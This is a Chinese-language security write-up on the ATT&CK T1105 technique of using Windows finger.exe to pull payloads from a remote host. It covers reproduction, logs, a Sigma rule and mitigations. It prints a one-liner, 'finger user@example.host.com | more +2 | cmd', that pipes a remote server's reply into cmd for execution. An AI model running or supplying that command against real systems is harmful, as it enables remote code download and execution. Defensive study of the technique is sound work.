# T1105-Win-入口工具转移-# Finger.exe(白名单)

## 描述

攻击者可能通过命令和控制通道从外部系统将工具或其他文件转移到被攻击的环境中，以将恶意工具或有效载荷引入目标网络。文件传输可通过专用工具（如FTP）或替代协议（如scp、rsync、sftp）实现，适用于Windows、Mac和Linux系统。攻击者常利用系统内置的白名单工具（如`Finger.exe`）来规避传统防病毒检测。

## 测试案例

`Finger.exe`是Windows系统内置的命令行工具，位于`C:\Windows\System32\finger.exe`或`C:\Windows\SysWOW64\finger.exe`，用于查询运行Finger服务或守护进程的远程主机（通常为UNIX系统）上一个或多个用户的信息。攻击者可通过连接到恶意Finger服务器，下载包含恶意shellcode的响应内容，并通过管道（如`cmd`）执行。

### 路径
```yml
- c:\windows\system32\finger.exe
- c:\windows\syswow64\finger.exe
```

### 示例命令
从远程Finger服务器下载有效载荷（Payload）。此示例连接到“example.host.com”，查询用户“user”，结果可能包含恶意shellcode，由`cmd`进程执行。
```yml
finger user@example.host.com | more +2 | cmd
```

### 用例
- 从恶意Finger服务器下载并执行有效载荷。
- 所需权限：用户权限。
- 操作系统：Windows 8.1、Windows 10、Windows 11、Windows Server 2008、Windows Server 2008R2、Windows Server 2012、Windows Server 2012R2、Windows Server 2016、Windows Server 2019、Windows Server 2022。

### Windows安全日志
- **事件ID 4688**：记录`finger.exe`进程创建及命令行参数（需启用命令行审核）。

### Sysmon日志
- **事件ID 1**：捕获`finger.exe`进程创建及命令行参数。
- **事件ID 3**：记录`finger.exe`发起的网络连接（目标IP/端口，通常为TCP 79端口）。
- **事件ID 11**：记录可能的恶意文件创建（若攻击者将响应保存为文件）。

### 网络日志
- 捕获`finger.exe`发起的TCP连接（默认端口79），检查目标主机是否异常。

## 测试复现

### 环境准备
- **靶机**：Windows 10。
- **权限**：用户权限（无需管理员）。
- **工具**：
  - `finger.exe`（系统自带，路径`C:\Windows\System32\finger.exe`或`C:\Windows\SysWOW64\finger.exe`）。
  - Sysmon（用于进程和网络监控）。
  - Wireshark（用于网络流量捕获）。
  - 测试Finger服务器（提供可控响应）。
- **网络**：允许TCP 79端口出站流量，建议在隔离网络中测试。
- **日志**：启用Windows安全日志和Sysmon日志。

### 攻击步骤
1. **执行Finger命令**：

```yml
C:\Users\liyang>Finger.exe

显示与运行手指服务的指定系统上某个用户有关
的信息。输出因远程系统而异。

FINGER [-l] [user]@host [...]

  -l        以长列表格式显示信息。
  user      指定需要其信息的用户。省略 user 参数
            将显示与指定主机上所有用户有关的信息。
  @host     指定需要其用户信息的远程系统上的服务器。

C:\Users\liyang>finger user@example.host.com | more +2 | cmd
Microsoft Windows [版本 10.0.18363.418]
(c) 2019 Microsoft Corporation。保留所有权利。
```

- 命令连接到`example.host.com`，查询用户`user`，并将响应通过管道传递给`cmd`执行。

## 测试留痕

```log
已创建新进程。
创建者主题:
安全 ID: DESKTOP-PT656L6\liyang
帐户名: liyang
帐户域: DESKTOP-PT656L6
登录 ID: 0x47126

进程信息:
新进程 ID: 0x2c8
新进程名称: C:\Windows\System32\finger.exe
令牌提升类型: %%1938
强制性标签: Mandatory Label\Medium Mandatory Level
创建者进程 ID: 0xc78
创建者进程名称: C:\Windows\System32\cmd.exe
进程命令行: finger  user@example.host.com
```

基于Sigma规则（`win_susp_finger_usage`），检测`finger.exe`的异常执行行为：

```yml
title: Finger.exe Suspicious Invocation
id: af491bca-e752-4b44-9c86-df5680533dbc
description: Detects suspicious aged finger.exe tool execution often used in malware attacks nowadays
author: Florian Roth, omkar72, oscd.community
date: 2021/02/24
references:
- https://twitter.com/bigmacjpg/status/1349727699863011328?s=12
- https://app.any.run/tasks/40115012-a919-4208-bfed-41e82cb3dadf/
- http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt
tags:
- attack.command_and_control
- attack.t1105
logsource:
category: process_creation
product: windows
detection:
  selection:
    Image|endswith: '\finger.exe'
  condition: selection
falsepositives:
- Admin activity (unclear what they do nowadays with finger.exe)
level: high
```

### 检测思路
1. **进程监控**：
   - 检查`finger.exe`的命令行参数是否包含远程主机地址（如`user@host`）。
   - 监控异常父进程（如`cmd.exe`）或管道操作（如`| cmd`）。
2. **网络监控**：
   - 检测`finger.exe`发起的TCP 79端口连接，重点关注非预期目标主机。
3. **行为监控**：
   - 检测`finger.exe`的运行是否伴随管道命令（如`more | cmd`）。
   - 检查响应内容是否触发后续进程（如`cmd.exe`执行shellcode）。
4. **关联分析**：
   - 结合Sysmon事件ID 1（进程创建）、3（网络连接）和可能的11（文件创建）进行关联，识别完整攻击链。

### 检测建议
- **告警规则**：基于Sigma规则，配置SIEM系统（如Splunk、Elastic）检测`finger.exe`的异常执行。
- **基线对比**：建立`finger.exe`的正常使用基线（通常在现代环境中极少使用），排除合法行为。
- **网络白名单**：限制`finger.exe`的出站流量，仅允许访问已知合法Finger服务器。
- **管道监控**：检测`finger.exe`输出到`cmd`或其他命令解释器的行为。

## 缓解措施
1. **限制网络访问**：
   - 配置防火墙，限制`finger.exe`的出站TCP 79端口流量，仅允许访问已知合法服务器。
2. **加强日志监控**：
   - 启用命令行参数记录和Sysmon日志，覆盖进程、网络和可能的文件操作。
3. **白名单管理**：
   - 使用应用白名单工具（如AppLocker）限制`finger.exe`的执行场景。
4. **禁用Finger协议**：
   - 在不需要Finger服务的环境中，禁用或移除`finger.exe`。
5. **定期审查**：
   - 检查系统内`finger.exe`的异常使用记录，结合威胁情报分析潜在风险。

## 参考推荐
- MITRE ATT&CK T1105  
  https://attack.mitre.org/techniques/T1105  
- Finger.exe  
  https://lolbas-project.github.io/lolbas/Binaries/Finger/  
- Finger使用方法  
  https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/ff961508(v=ws.11)  
- Sigma: win_susp_finger_usage  
  https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_susp_finger_usage.yml
